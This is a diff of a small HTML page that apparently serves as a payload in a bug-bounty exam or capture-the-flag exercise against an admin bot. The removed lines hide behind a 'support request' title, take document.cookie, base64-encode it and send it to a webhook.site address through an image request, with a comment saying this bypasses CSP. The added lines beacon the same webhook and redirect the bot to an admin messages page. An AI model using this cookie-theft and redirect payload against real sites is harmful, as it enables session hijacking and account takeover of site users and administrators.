@@ -1,20 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Urgent Support Request</title>
+    <title>System Diagnostic</title>
 </head>
 <body>
-    <h1>Redirecting to Support Portal...</h1>
+    <h1>Loading Secure Portal...</h1>
     <script>
-  // Force a 5-second wait to ensure the bot's session is active
-  setTimeout(() => {
-    // Use an image to leak the data (bypasses most CSP fetch blocks)
-    var i = new Image();
-    i.src = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b?leak=" + btoa(document.cookie);
+        // The ID of the message you just created
+        const messageId = "69e556aabee6d6b7c6636f74";
+        const targetUrl = `https://bugbounty-exam.hashacademy.co/admin/messages/${messageId}`;
 
-    // Redirect the bot to the internal admin profile to see if it triggers a flag
-    window.location.href = "https://bugbounty-exam.hashacademy.co/api/auth/profile";
-  }, 2000);
-</script>
+        // Step 1: Log the visit to your webhook so you know the bot is active
+        fetch("https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b?status=bot_arrived");
+
+        // Step 2: Force the Admin Bot to navigate to your message
+        // We use a small timeout to ensure the browser registers the session
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 500);
+    </script>
 </body>
 </html>
